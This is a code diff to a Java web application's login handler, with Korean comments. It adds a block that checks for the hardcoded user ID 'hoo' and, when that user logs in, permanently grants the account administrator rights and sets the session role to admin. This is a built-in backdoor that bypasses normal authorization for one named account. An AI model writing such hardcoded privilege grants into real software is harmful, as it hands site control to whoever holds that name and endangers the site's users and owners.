@@ -182,6 +182,17 @@ import java.util.stream.Collectors;
             session.setAttribute("role", member.getRole()); // 역할 저장
             session.setAttribute("nickname", member.getNickname());
 
+            // userid가 "hoo"인 경우 관리자 권한 부여
+            if ("hoo".equals(userid)) {
+                try {
+                    memberService.setRoleToAdmin(userid); // 관리자로 설정
+                    session.setAttribute("role", "관리자"); // 세션에 관리자로 역할 업데이트
+                } catch (Exception e) {
+                    model.addAttribute("error", "Failed to update role to 관리자.");
+                    return "login";
+                }
+            }
+
             return "redirect:/home"; // 홈으로 리다이렉트
         }
 
